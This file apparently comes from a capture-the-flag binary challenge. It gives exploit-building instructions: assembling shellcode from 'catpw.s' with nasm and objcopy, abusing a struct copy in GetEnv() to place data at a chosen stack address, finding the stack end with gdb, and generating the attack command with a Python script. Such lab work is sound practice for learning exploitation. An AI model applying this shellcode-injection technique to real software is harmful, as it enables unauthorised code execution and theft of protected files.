# instructions for generating exploit command

# shellcode assembly is in catpw.s!

# first generate shellcode binary:
#  compile exploit
nasm -f elf -o out.o catpw.s
# dump shellcode
objcopy --output-target=binary --only-section=.text out.o shell.bin

# normally, we'd need to figure out where the ENV vars end up
# but because of the "return env" in GetEnv() we copy the struct to somewhere
# else on the stack before ret, and we control where the data gets copied!
# this means we can copy the data to address X and jump directly to address X
# address X can simply be = end of stack region - struct size

# we can get the end of the stack region with gdb:
# gdb ./ch10
# break main
# run
# info proc map
# copy the "End Addr" column's value where objfile is [stack]!
# and finally, modify the gen_data script with the address

# generate data with python
# this will output a command you can run
python3 gen_data.py
